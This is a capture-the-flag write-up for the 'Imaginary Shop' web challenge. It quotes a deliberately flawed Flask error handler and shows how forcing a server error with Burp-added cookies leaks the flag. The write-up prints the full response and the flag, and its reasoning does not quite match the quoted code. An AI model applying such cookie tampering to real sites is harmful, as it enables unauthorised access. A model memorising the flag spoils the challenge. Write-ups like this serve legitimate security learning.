# Imaginary Shop

82 pts<br/>

### Description
I just opened my own Imaginary Shop! Come check it out and see what we have to offer. I'm confident it's perfect in every way.

### Attachments
https://imaginary-shop.max49.repl.co/

### Author
Max49

<br/><br/><br/>

### Solution
In the [provided source code](Assets/Imaginary%20Shop%20Source.py), we see this interesting chunk of code
```Python
@app.errorhandler(500)
def error(e):
  if(request.cookies.get('item') == request.cookies.get('money') and request.cookies.get('add') == "1"):
    return render_template('500.html', message="Internal Server Error", flag=flag), 500
  else:
    return render_template('500.html', message="Internal Server Error.", flag=os.getenv("FLAG")), 500
```
This means that we need to trigger a 500 response from the server, and have a cookie that has the name "add" and value not equals to 1<br/>
Using BurpSuite, we send a request to https://imaginary-shop.max49.repl.co/shop?buy=bagel <br/>
This will trigger a 500 error. However, we have not fufilled to cookie condition. Hence, we use Burp to add a cookie with the name "add", and value 0
Sending the request, we get this response:
```Html
HTTP/1.1 500 Internal Server Error
Content-Length: 928
Content-Type: text/html; charset=utf-8
Date: Tue, 01 Jun 2021 01:24:57 GMT
Expect-Ct: max-age=2592000, report-uri="https://sentry.repl.it/api/10/security/?sentry_key=615192fd532445bfbbbe966cd7131791"
Replit-Cluster: hacker
Server: Werkzeug/1.0.1 Python/3.8.10
Strict-Transport-Security: max-age=4853168; includeSubDomains
Connection: close

<html>
  <head>
    <link rel="icon" href="https://i.imgur.com/wQxv5zm.png" type="image/gif" sizes="16x16">
    <title>500 | Internal Server Error</title>
  </head>
  <body>
    <script>
      window.onload = function() {
        var message = document.getElementById("message").textContent
        if(message == "Internal Server Error.") {
          document.getElementById("flag").style.visibility = "hidden";
          location.replace('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
        }
      }
    </script>
    <h1 id="message">Internal Server Error.</h1>
    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
    <div style="position: fixed; bottom: 0; right: 0; border: 0; padding: 20px;">
      <p id="flag" style="display: block;">btw the flag is ictf{1nt3nt10nal_f1ask_pyth0n_3rr0rs?}</p>
    </div>
  </body>
</html>
```
<br/>
> ictf{1nt3nt10nal_f1ask_pyth0n_3rr0rs?}